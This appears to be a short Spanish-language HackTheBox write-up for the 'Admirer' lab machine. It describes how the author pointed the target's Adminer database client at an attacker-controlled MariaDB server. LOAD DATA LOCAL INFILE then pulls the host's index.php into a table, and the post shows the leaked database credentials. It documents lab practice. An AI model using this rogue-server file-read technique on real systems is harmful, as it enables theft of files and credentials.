---
title: "HTB Admirer"
description: "Base de Datos"
date: "2025-11-15"
banner:
  src: "../../images/database.jpg"
  alt: "Database typical icon"
  caption: 'Photo by <a href="https://unsplash.com/@sunder_2k25">Sunder Muthukumaran</a> on Unsplash'
categories:
  - "DB"
  - "Theory"
  - "Basic"
keywords:
  - "DB"
  - "Theory"
  - "Basic"
---

# Que aprendi de la maquina Admirer

## Abuso del DB-client llamado Adminer

Aqui vemos tres cosas, 

1. si encontramos un cliente remoto podemos hacer que se conecte a nosotros, 
2. haciendo eso logramos un entorno remoto donde ejecutar Queries o intentar cosas,
3. si el cliente remoto permite ejecutar funciones peligrosas podriamos intentar leer archivos locales del host remoto 
   1. (esto es similar a lo que hacemos cuando un host-PHP nos permite ejecutar funciones como shell_exec).

> Digamos que no es vulnerable sino "abusable" ya que su configuracion permite el uso de funciones que podemos abusar.

### Ejemplo (Accedemos a un archivo y lo guardamos en una tabla para poder leerlo)

```sql
LOAD DATA LOCAL INFILE '../index.php'
INTO TABLE some.shit
FIELDS TERMINATED BY "\n"
```

Esquema de Ataque

```sql
-- Attacker (creamos tabla, usuario y configuramos servicio)
-- # tabla y usuario
CREATE DATABASE some; USE some; CREATE TABLE shit (name VARCHAR(2000));
CREATE USER 'some'@'10.10.10.187' IDENTIFIED BY 'some123*';
GRANT ALL PRIVILEGES ON backup.* TO 'some'@'10.10.10.187';
-- # servicio
/etc/mysql/mariadb.conf.d/50-server.cnf
bind-address = 10.10.14.2
-- # opcional: firewall (allow)
ufw allow from 10.10.10.187 to any port 3306
-- # restart servicio 
systemctl restart mariadb

-- Victim
-- # DB-Client
Server: <attacker-ip>
Username: some
Password: some123*
Database: some
-- # Query
LOAD DATA LOCAL INFILE '../index.php'
INTO TABLE some.shit
FIELDS TERMINATED BY "\n" -- # permite que cada linea se guarde en una row de la tabla
-- # La informacion esta disponible en database.tabla
 row:	  <?php
 row:	  $username = "waldo";
 row:	  $password = "&<h5b~yK3F#{PaPB&dA}{H>";
 row:	  $dbname = "admirerdb";
```













